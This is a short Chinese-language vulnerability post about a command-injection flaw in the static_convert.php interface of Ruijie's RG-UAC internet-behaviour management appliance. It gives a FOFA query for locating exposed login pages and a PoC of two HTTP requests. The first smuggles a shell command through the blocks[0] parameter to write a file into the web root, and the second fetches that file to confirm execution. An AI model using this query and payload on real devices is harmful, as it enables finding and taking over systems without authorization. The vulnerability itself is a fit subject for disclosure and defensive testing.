**fofa**

```
title="RG-UAC登录页面"
```

**一、漏洞简述**

锐捷统一上网行为管理与审计RG-UAC是星网锐捷网络有限公司自主研发的业界领先的上网行为管理与审计产品，以路由、透明或混合模式部署在网络的关键节点上，对数据进行2-7层的全面检查和分析，深度识别、管控和审计数百种IM聊天软件、P2P下载软件、炒股软件、网络游戏应用、流媒体在线视频应用等常见应用，并利用智能流控、智能阻断、智能路由、智能DNS策略等技术提供强大的带宽管理特性，配合创新的社交网络行为精细化管理功能、清晰易管理日志等功能，同时具备了最精细的用户上网行为的审计功能，提供了业界最全面、完善的上网行为管理解决方案。锐捷统一上网行为管理与审计RG-UAC产品线提供不同档次的多款型号，适用于数据中心、大型网络边界、中小型企业等全业务应用场景。其接口static_convert存在任意命令执行漏洞，攻击者可通过该漏洞获取系统权限。

**二、漏洞检测poc**

```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||echo%20'HelloWorldTest1'>/var/www/html/tmptest%0A HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close

```

```yaml
GET /tmptest HTTP/1.1
Host:x.x.x.x
Connection: close

```

